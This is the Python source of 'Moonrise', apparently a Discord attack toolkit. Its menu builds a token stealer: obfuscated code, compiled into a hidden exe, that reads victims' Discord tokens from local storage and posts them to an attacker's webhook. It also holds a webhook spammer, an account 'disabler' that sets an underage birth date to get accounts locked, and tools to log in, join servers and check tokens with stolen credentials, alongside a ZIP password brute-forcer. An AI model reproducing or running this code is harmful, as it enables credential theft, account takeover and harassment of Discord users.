print("Loading...")
import requests
from contextlib import asynccontextmanager
from random import randint
import time
import os
from colorama import init, Fore, Style
import ctypes
from datetime import datetime
from tqdm import tqdm
import zipfile
import shutil
from selenium import webdriver
import sys
import platform
import psutil
if not sys.version_info.major == 3:
    print(f"[{Fore.RED}>{Fore.RESET}] Please install Python 3")
    time.sleep(3)
    exit()
print(f"[{Fore.CYAN}>{Fore.RESET}]Checking for Updates...{Fore.RESET}")
checkupdate = requests.get("https://raw.githubusercontent.com/Onuphrius/setup/main/version.txt")
updateversion = checkupdate.content.decode('ascii')
version = "1.3.2"
if version in updateversion:
    print(f"[{Fore.GREEN}>{Fore.RESET}]File is up to date{Fore.RESET}")
    time.sleep(1)
else:
    print(f"[{Fore.GREEN}>{Fore.RESET}]File is updating.{Fore.RESET}")
    TEMP = os.getenv('TEMP') 
    update = requests.get("https://raw.githubusercontent.com/Onuphrius/setup/main/Moonrise.py")
    filename = TEMP + "\Moonrise"
    data = update.content
    with open(f"{filename}.py", 'wb') as file:
        file.write(data)
    os.system(f"pyinstaller --onefile --noconsole --log-level=ERROR -i NONE {filename}.py ")
    data = '''
shutil.move(f"{os.getcwd()}\\dist\\Moonrise.exe", f"{os.getcwd()}\\Moonrise.exe")
shutil.rmtree('build')
shutil.rmtree('dist')
os.remove(f'Moonrise.spec')
os.remove(f'Moonrise.py')
dir = os.getcwd()
os.remove(dir+'\%s' % sys.argv[0])
'''
    with open("cleanup.py", 'w') as file:
        file.write(data)
    os.system("start cleanup.py")
    exit()
try:
    os.mkdir('./util')
except:
    print(f"[{Fore.YELLOW}>{Fore.RESET}]Folder already exists{Fore.RESET}")


def main():
    ctypes.windll.kernel32.SetConsoleTitleW(f"Moonrise {version}")
    os.system('cls' if os.name=='nt' else 'clear')
    init()
    banner = Style.BRIGHT + f'''{Fore.CYAN}                                                                                                
                                                                                                 .....
                                                                                               .://oso-
                                                                                             .:+oymNh/-
                                                                                            .:+sdNNm+:.
                ███╗   ███╗ ██████╗  ██████╗ ███╗   ██╗█████╗  ██╗███████╗███████╗          -/shNmmm+-.
                ████╗ ████║██╔═══██╗██╔═══██╗████╗  ██║██╔══██╗██║██╔════╝██╔════╝          -+shNmmNs:-
                ██╔████╔██║██║   ██║██║   ██║██╔██╗ ██║██████╔╝██║███████╗█████╗            ./oymmmmms/:-..
                ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╗██║██╔══██╗██║╚════██║██╔══╝             -/oyddddmdyo+/:-.
                ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚████║██║  ██║██║███████║███████╗            -/oyddddmdyo+/:-.
                ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝              .-://+//::--.
                /> Made by BigSchniff#7414                                                         .....                                 '''.replace('█', f'{Fore.WHITE}█{Fore.CYAN}') + f'''
   
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
{Fore.WHITE} [{Fore.CYAN}1{Fore.RESET}] Discord                 {Fore.WHITE} [{Fore.CYAN}2{Fore.RESET}] Proxy Scraper             {Fore.WHITE}[{Fore.CYAN}3{Fore.RESET}] BruteZip                {Fore.WHITE} [{Fore.CYAN}4{Fore.RESET}] PC Information
{Fore.WHITE} [{Fore.RED}5{Fore.RESET}] Exit 
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Style.RESET_ALL}'''
    print(Fore.CYAN + banner)
    select = input(f'{Fore.WHITE}[{Fore.CYAN}>{Fore.WHITE}]Select:')

    if select=='1': 
        discord()

    elif select=='2':
        try:
            try:
                os.mkdir('./util/proxy')
            except:
                print(f"[{Fore.YELLOW}>{Fore.RESET}]Folder already exists{Fore.RESET}")
            url = 'https://api.openproxylist.xyz/http.txt'
            r = requests.get(url)
            resultshttp = r.text
            with open("./util/proxy/http.txt", "w") as file:
                file.write(resultshttp)
            print(f"[{Fore.CYAN}>{Fore.RESET}]Scraped http Proxys")
            url = 'https://api.openproxylist.xyz/socks4.txt'
            r = requests.get(url)
            resultssocks4 = r.text
            with open("./util/proxy/socks4.txt", "w") as file:
                file.write(resultssocks4)
            print( f"[{Fore.CYAN}>{Fore.RESET}]Scraped socks4 Proxys")
            url = 'https://api.openproxylist.xyz/socks5.txt'
            r = requests.get(url)
            resultssocks5 = r.text
            with open("./util/proxy/socks5.txt", "w") as file:
                file.write(resultssocks5)
            print(f"[{Fore.CYAN}>{Fore.RESET}]Scraped socks5 Proxys")
            with open("./util/proxy/proxy.txt", "w") as file:
                file.write(resultshttp)
                file.write(resultssocks4)
                file.write(resultssocks5)
            time.sleep(2)
            main()
        except Exception as e:
            print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            time.sleep(3)
            main()

    elif select=='3':
        try:
            wordlist = input(f"{Fore.WHITE}[{Fore.CYAN}>{Fore.WHITE}]Insert Path of Wordlist:")
            zip_file = input(f"{Fore.WHITE}[{Fore.CYAN}>{Fore.WHITE}]Insert Path of Zipfile:")
            zip_file = zipfile.ZipFile(zip_file)
            n_words = len(list(open(wordlist, "rb")))
            print(f"{Fore.WHITE}[{Fore.CYAN}>{Fore.WHITE}]{n_words} total Passwords")
            with open(wordlist, "rb") as wordlist:
                for word in tqdm(wordlist, total=n_words, unit="word"):
                    try:
                        zip_file.extractall(pwd=word.strip())
                        print(f"{Fore.WHITE}[{Fore.GREEN}>{Fore.WHITE}]Password found:", word.decode().strip())
                        time.sleep(3)
                        main()
                    except:
                        continue
            print(f"{Fore.WHITE}[{Fore.RED}>{Fore.WHITE}]Password not found, try other Wordlist")
        except Exception as e:
            print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            time.sleep(3)
            main()

    elif select=='4':
        try:
            c_name = platform.node()
            maschine_type = platform.machine()
            prosessor = platform.processor()
            pf = platform.platform() 
            op_sys = platform.system()
            op_re = platform.release()
            op_ver = platform.version()
            cpu_count = psutil.cpu_count(logical=False)
            ram = round(psutil.virtual_memory().total/1000000000, 2)
            inf = f'''
{c_name}
{pf} / {op_sys} {op_re}({op_ver})
{maschine_type} {prosessor} CPU Cores:{cpu_count} Ram:{ram}GB
            '''
            print(inf)
            input()
        except Exception as e:
            print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            time.sleep(3)
            main()
    elif select=='5':
        try:
            exit()
        except Exception as e:
            print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            time.sleep(3)
            main()
    else:
        main()



def discord():
    ctypes.windll.kernel32.SetConsoleTitleW(f"Moonrise {version}")
    os.system('cls' if os.name=='nt' else 'clear')
    init()
    banner = Style.BRIGHT + f'''{Fore.CYAN}                                                                                                
                                                                                                 .....
                                                                                               .://oso-
                                                                                             .:+oymNh/-
                                                                                            .:+sdNNm+:.
                ███╗   ███╗ ██████╗  ██████╗ ███╗   ██╗█████╗  ██╗███████╗███████╗          -/shNmmm+-.
                ████╗ ████║██╔═══██╗██╔═══██╗████╗  ██║██╔══██╗██║██╔════╝██╔════╝          -+shNmmNs:-
                ██╔████╔██║██║   ██║██║   ██║██╔██╗ ██║██████╔╝██║███████╗█████╗            ./oymmmmms/:-..
                ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╗██║██╔══██╗██║╚════██║██╔══╝             -/oyddddmdyo+/:-.
                ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚████║██║  ██║██║███████║███████╗            -/oyddddmdyo+/:-.
                ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝              .-://+//::--.
                /> Made by BigSchniff#7414                                                         .....                                 '''.replace('█', f'{Fore.WHITE}█{Fore.CYAN}') + f'''
   
{Fore.WHITE}─{Fore.CYAN}Discord{Fore.RESET}────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
{Fore.WHITE} [{Fore.CYAN}1{Fore.RESET}] Token Stealer                {Fore.WHITE}[{Fore.CYAN}2{Fore.RESET}] Webhook Spammer             {Fore.WHITE}[{Fore.CYAN}3{Fore.RESET}] Webhook Deleter                {Fore.WHITE}[{Fore.CYAN}4{Fore.RESET}] Token Info
{Fore.WHITE} [{Fore.CYAN}5{Fore.RESET}] Account Disabler             {Fore.WHITE}[{Fore.CYAN}6{Fore.RESET}] Token Login                 {Fore.WHITE}[{Fore.CYAN}7{Fore.RESET}] Token Joiner                   {Fore.WHITE}[{Fore.CYAN}8{Fore.RESET}] Token Checker
{Fore.WHITE} [{Fore.RED}9{Fore.RESET}] Back
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Style.RESET_ALL}'''
    print(Fore.CYAN + banner)
    select = input(f'{Fore.WHITE}[{Fore.CYAN}>{Fore.WHITE}]Select:')


    if select=='1':
        filename = input(f"[{Fore.CYAN}>{Fore.RESET}]Please Insert Filename:")
        webhook = input(f"[{Fore.CYAN}>{Fore.RESET}]Please Insert WebHook to send Token:")
        print(f"[{Fore.CYAN}>{Fore.RESET}]Creating Token Stealer")
        try:
            try:
                os.system(f"pip install -q requests")
                os.system(f"pip install -q pyinstaller")

            except Exception as e:
                    print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            with open(f"{filename}.py", 'w', encoding="utf-8") as TokenFile:
                TokenFile.write("""
import os
import requests
import re
r =requests.session ()
ds=('YOUR_WEBHOOK')
app=os.getenv ('APPDATA')
tokendir =app +'\\\\Discord\\\\Local Storage\\\\leveldb\\\\'
dird =os.listdir (tokendir )
for file in dird :
    y =(str (tokendir )+str (file ))
def find_tokens (O0OOO00OO0O0OO00O ):
    O0OOO00OO0O0OO00O =tokendir 
    OOOO000000OO0OO00 =[]
    for OO000O00O000O0OO0 in os .listdir (O0OOO00OO0O0OO00O ):
        if not OO000O00O000O0OO0 .endswith ('.log')and not OO000O00O000O0OO0 .endswith ('.ldb'):
            continue
        for O0O0OO0OO0OO0OOOO in [OO0000O000O00O0O0 .strip ()for OO0000O000O00O0O0 in open (f'{O0OOO00OO0O0OO00O}\\{OO000O00O000O0OO0}',errors ='ignore').readlines ()if OO0000O000O00O0O0 .strip ()]:
            for O0OOO0O00OO0000OO in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):
                for O0OOO00OOOOO0OOO0 in re .findall (O0OOO0O00OO0000OO ,O0O0OO0OO0OO0OOOO ):
                    OOOO000000OO0OO00 .append (O0OOO00OOOOO0OOO0 )
    return OOOO000000OO0OO00 
tokens=str (find_tokens (tokendir ))
tokens=tokens.replace("[","").replace("]","").replace("'","").replace("\\n","").replace(", ","\\n")
data =requests.post (ds ,json ={'content':f"`{tokens}`" ,"username":str ("Moonrise"),"avatar_url":str ("https://image.shutterstock.com/image-vector/vector-illustration-night-sky-anime-260nw-1516589039.jpg")})
                """.replace('YOUR_WEBHOOK', webhook))
            print(f"{Fore.WHITE}[{Fore.GREEN}>{Fore.WHITE}]Python file successfully created")
            print(f"{Fore.WHITE}[{Fore.CYAN}>{Fore.WHITE}]Creating exe file...")
            os.system(f"pyinstaller --onefile --noconsole --log-level=ERROR -i NONE -n {filename} {filename}.py")
            shutil.move(f"{os.getcwd()}\\dist\\{filename}.exe", f"{os.getcwd()}\\util\\{filename}.exe")
            shutil.rmtree('build')
            shutil.rmtree('dist')
            shutil.rmtree('__pycache__')
            os.remove(f'{filename}.spec')
            os.remove(f'{filename}.py')
            print(f"{Fore.WHITE}[{Fore.GREEN}>{Fore.WHITE}]Exe file successfully created")
            time.sleep(3)
            discord()
        except Exception as e:
                    print(f"[{Fore.RED}>{Fore.RESET}]{e}")
                    time.sleep(3)
                    discord()

    elif select=='2': 
        n = 0 
        rl = 0
        avatar = None
        message = input(f"[{Fore.CYAN}>{Fore.RESET}]Please Insert WebHook Spam Message:")
        webhook = input(f"[{Fore.CYAN}>{Fore.RESET}]Please Insert WebHook URL:")
        name = input("[{Fore.CYAN}>{Fore.RESET}]Please Insert Webhook Name:")
        avatar = input(f"[{Fore.CYAN}>{Fore.RESET}]Please Insert Webhock Avatar URL:")
        def spammer(message, webhook, name, avatar, n, rl):
            while True:
                try:
                    data = requests.post(webhook, json={'content': message, "username": str(name), "avatar_url": str(avatar)})
                    if data.status_code == 204:
                        print(Fore.GREEN + f"[{n}]-> Sent      {message}")
                        n = n + 1
                        rl = 0
                    elif data.status_code == 429:
                        print(Fore.RED + f"[{n}]->Rate limited")
                        rl = rl +1
                        time.sleep(0.5)
                        if rl == 2:
                            print(Fore.RED + f"[{n}]->Hard Rate limited")
                            time.sleep(45)
                            
                    else:
                        print(f"[{Fore.RED}>{Fore.RESET}]Bad Webhook: {webhook}")
                        time.sleep(5)
                except Exception as e:
                    print(f"[{Fore.RED}>{Fore.RESET}]{e}")
                    time.sleep(3)
                    discord()
        while True:
            spammer(message, webhook, name, avatar, n, rl)

    elif select=='3':
        try:
            webhook = input(f"[{Fore.CYAN}>{Fore.RESET}]Please Insert WebHook URL:")
            data = requests.get(webhook)
            if data.status_code != 200:
                print(f"[{Fore.RED}>{Fore.RESET}] Invalid Webhook")
                time.sleep(3)
                discord()
            else:
                requests.delete(webhook)
                print(f"[{Fore.GREEN}>{Fore.RESET}] Webhook got deleted")
                time.sleep(3)
                discord()
        except Exception as e:
            print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            time.sleep(3)
            discord()

    elif select=='4':
        try:
            token = input(f"[{Fore.CYAN}>{Fore.RESET}]Please Insert Token:")
            header = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
            r = requests.get('https://discord.com/api/v9/users/@me', headers=header)
            if r.status_code==200:
                nitro_left = "None"
                info = r.json()
                userid = info["id"]
                createdat = datetime.utcfromtimestamp(((int(userid) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
                nitro = False
                rnitro = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=header)
                ninfo = rnitro.json()
                nitro = bool(len(rnitro.json()) > 0)
                if nitro:
                    d1 = datetime.strptime(ninfo[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    d2 = datetime.strptime(ninfo[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    nitro_left = abs((d2 - d1).days)
                output =(f''' 
                  Information
─────────────────────────────────────────────────
{Fore.CYAN}Name:{Fore.RESET}{info["username"]}#{info["discriminator"]}
{Fore.CYAN}Bio:{Fore.RESET}{info["bio"]}
{Fore.CYAN}ID:{Fore.RESET}{userid} {Fore.CYAN}Created at:{Fore.RESET} {createdat}
{Fore.CYAN}Email:{Fore.RESET}{info["email"]} {Fore.CYAN}Verified:{Fore.RESET}{info["verified"]} {Fore.CYAN}2FA:{Fore.RESET}{info["mfa_enabled"]}
{Fore.CYAN}Phone:{Fore.RESET}{info["phone"]}
{Fore.CYAN}Nitro:{Fore.RESET}{nitro} {Fore.CYAN}Expires in: {Fore.RESET}{nitro_left}{Fore.CYAN} day(s){Fore.RESET}
────────────────────────────────────────────────
           ''')
                print(output)
                input(f"{Fore.WHITE}[{Fore.CYAN}>{Fore.WHITE}]Press Enter to continue...")
                discord()
            else:
                print(f"[{Fore.CYAN}>{Fore.RESET}]Invalid Token")
                time.sleep(3)
                discord()
        except Exception as e:
            print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            time.sleep(3)
            discord()

    elif select=='5':
        try:
            token = input(f"{Fore.WHITE}[{Fore.CYAN}>{Fore.WHITE}]Please Insert Token:")
            headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
            r = requests.patch('https://discordapp.com/api/v6/users/@me', headers=headers, json={'date_of_birth': '2017-2-11'})
            if r.status_code == 400:
                r_message = r.json().get('date_of_birth', ['no response message'])[0]

                if r_message == "You need to be 13 or older in order to use Discord.":
                    print(f"{Fore.WHITE}[{Fore.GREEN}>{Fore.WHITE}]Account disabled")
                    
                elif r_message == "You cannot update your date of birth.":
                    print(f"{Fore.WHITE}[{Fore.RED}>{Fore.WHITE}]Account is immune to exploit")
                else:
                    print(f"{Fore.WHITE}[{Fore.RED}>{Fore.WHITE}]Unknown response: {r_message}")
            else:
                print(f"{Fore.WHITE}[{Fore.RED}>{Fore.WHITE}]Failed to disable Account")
            time.sleep(3)
            discord()

        except Exception as e:
            print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            time.sleep(3)
            discord()

    elif select=='6':
        try:
            token = input(f"{Fore.WHITE}[{Fore.CYAN}>{Fore.WHITE}]Please Insert Token:")
            options = webdriver.ChromeOptions()
            options.add_experimental_option("detach", True)
            options.add_experimental_option('excludeSwitches', ['enable-logging'])
            browser = webdriver.Chrome(executable_path='./util/chromedriver.exe', options=options)
            script = """
              function login(token) {
              setInterval(() => {
              document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
              }, 50);
              setTimeout(() => {
              location.reload();
              }, 2500);
              }
              """
            browser.get("https://discord.com/login")
            browser.execute_script(script + f'\nlogin("{token}")')
            discord()
        except Exception as e:
            print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            time.sleep(3)
            discord()
    
    elif select=='7':
        try:
            filepath = input(f'[{Fore.CYAN}>{Fore.RESET}]Please Insert Filepath(default:"./util/tokens.txt"):')
            invite = input(f'[{Fore.CYAN}>{Fore.RESET}]Please Insert Invite Link:')
            if filepath=="":
                filepath = "./util/tokens.txt"
            invite = invite.replace("https://discord.gg/", "")
            invite = invite.replace("discord.gg/", "")
            invite = invite.replace("https://discord.com/invite/", "")
            with open(filepath, "r") as tokens:
                while (token := tokens.readline().rstrip()):
                    headers = {
                "path": "/api/v9/invites/" + invite,
                'Content-Type': 'application/json',
                "Authorization": token,
                "content-length": "0",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
            }
                    r = requests.post(f"https://discord.com/api/v8/invites/{invite}", headers=headers)
                    if r.status_code==200 or 204:
                        print(f"[{Fore.GREEN}>{Fore.RESET}][{token}] joined server")
                    else:
                        print(f"[{Fore.RED}>{Fore.RESET}][{token}] failed to join server")
                    
            input(f"[{Fore.CYAN}>{Fore.RESET}]Press any key to continue...")
        except Exception as e:
            print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            time.sleep(3)
            discord()

    elif select=='8':
        try:
            valid = 0
            v = 0
            invalid = 0
            uv = 0
            filepath = input(f'[{Fore.CYAN}>{Fore.RESET}]Please Insert Filepath(default:"./util/tokens.txt"):')
            display = input(f'[{Fore.CYAN}>{Fore.RESET}]Should Tokens be displayed(y/n):')
            if filepath=='':
                filepath = "./util/tokens.txt"
            with open(filepath, "r") as tokens:
                while (token := tokens.readline().rstrip()):
                    
                    header = {
                    'Authorization': token,
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                    }
                    r = requests.get('https://discord.com/api/v9/users/@me', headers=header)

                    if r.status_code==200:
                        if display=="n":
                            token = 'x'*len(token)
                        info = r.json()
                        valid = valid + 1
                        if info["verified"]==True:
                            verified = (f'{Fore.GREEN}Verified{Fore.RESET}')
                            v = v +1
                        else:
                            verified = (f'{Fore.RED}Verified{Fore.RESET}')
                            uv = uv +1

                        print(f'[{Fore.CYAN}>{Fore.RESET}][{token}] {Fore.GREEN}VALID {verified} ')
                    else:
                        print(f"[{Fore.CYAN}>{Fore.RESET}][{token}] {Fore.RED}INVALID")
                        invalid = invalid + 1
                print(f'[{Fore.CYAN}>{Fore.RESET}]Valid:{Fore.GREEN}{valid}{Fore.RESET} Verified:{Fore.GREEN}{v}{Fore.RESET} Invalid:{Fore.RED}{invalid}{Fore.RESET} Unverified:{Fore.RED}{uv}{Fore.RESET} ')
                input(f"[{Fore.CYAN}>{Fore.RESET}]Press any key to continue...")
                discord()
        except Exception as e:
            print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            time.sleep(3)
            discord()

    elif select=='beta9':
        try:
            invites = input(f'[{Fore.CYAN}>{Fore.RESET}]Please Insert Filepath to Invites(default:"./util/invites.txt"):')
            message = input(f'[{Fore.CYAN}>{Fore.RESET}]Please Insert Filepath to Message(default:"./util/message.json"):')
            scouttoken = input(f'[{Fore.CYAN}>{Fore.RESET}]Please Insert a Token to join the Servers:')
            tokenpath = input(f'[{Fore.CYAN}>{Fore.RESET}]Please Insert Filepath to Tokens(default:"./util/tokens.txt"):')
            if invites=="":
                invites = "./util/invites.txt"
            if message=="":
                message = "./util/message.json"
            if tokenpath=="":
                tokenpath = "./util/tokens.txt"
            print(f"[{Fore.CYAN}>{Fore.RESET}]Making invite codes")
            with open(invites, 'r') as file:
                data = file.read()        
            data = data.replace("https://discord.gg/", "").replace("discord.gg/", "").replace("https://discord.com/invite/", "")
            with open(invites, 'w') as file:
                file.write(data)
            print(f"[{Fore.CYAN}>{Fore.RESET}]Scout Account joining Servers")
            with open(invites, 'r') as file:
                while (invite := file.readline().rstrip()):
                    headers = {
                "path": "/api/v9/invites/" + invite,
                'Content-Type': 'application/json',
                "Authorization": scouttoken,
                "content-length": "0",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
            }
                    r = requests.post(f"https://discord.com/api/v8/invites/{invite}", headers=headers)
                    if r.status_code==200 or 204:
                        print(f"[{Fore.GREEN}>{Fore.RESET}]Scout Account joined server")
                    else:
                        print(f"[{Fore.RED}>{Fore.RESET}]Scout Account failed to join server")
            print(f"[{Fore.CYAN}>{Fore.RESET}]Fetching Guilds members")
        except Exception as e:
            print(f"[{Fore.RED}>{Fore.RESET}]{e}")
            time.sleep(3)
            discord()

    elif select=='9':
        main()
    else:
        discord()
if __name__ == "__main__":
    main()
